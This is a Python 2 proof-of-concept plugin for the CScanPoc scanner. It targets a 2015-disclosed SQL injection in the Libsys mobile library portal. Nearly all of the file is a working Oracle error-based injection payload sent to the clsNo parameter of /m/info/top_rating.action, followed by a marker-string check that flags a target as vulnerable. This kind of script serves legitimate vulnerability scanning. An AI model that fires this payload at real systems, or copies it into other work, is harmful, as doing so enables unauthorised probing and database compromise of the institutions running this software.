# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'e73601b9-288c-4134-80d2-8ec672699e52'
    name = '汇文软件通用型手机图书馆掌上门户 sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-01-22'  # 漏洞公布时间
    desc = '''
        汇文软件（Libsys）通用型手机图书馆掌上门户存在sql注入漏洞。
        /m/info/top_rating.action?clsNo=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '汇文软件通用型手机图书馆掌上门户'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8b712b6d-6808-4fb4-a385-814247a42f4c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.2 http://www.wooyun.org/bugs/wooyun-2010-092533
            payload = "/m/info/top_rating.action?clsNo=%00'%20AND%202050=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(120)||CHR(113)||CHR(113)||(SELECT%20(CASE%20WHEN%20(2050=2050)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(104)||CHR(101)||CHR(110)||CHR(116)||CHR(97)||CHR(105)))%20FROM%20DUAL)%20AND%20'NpTg'='NpTg"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)

            if 'hentai' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
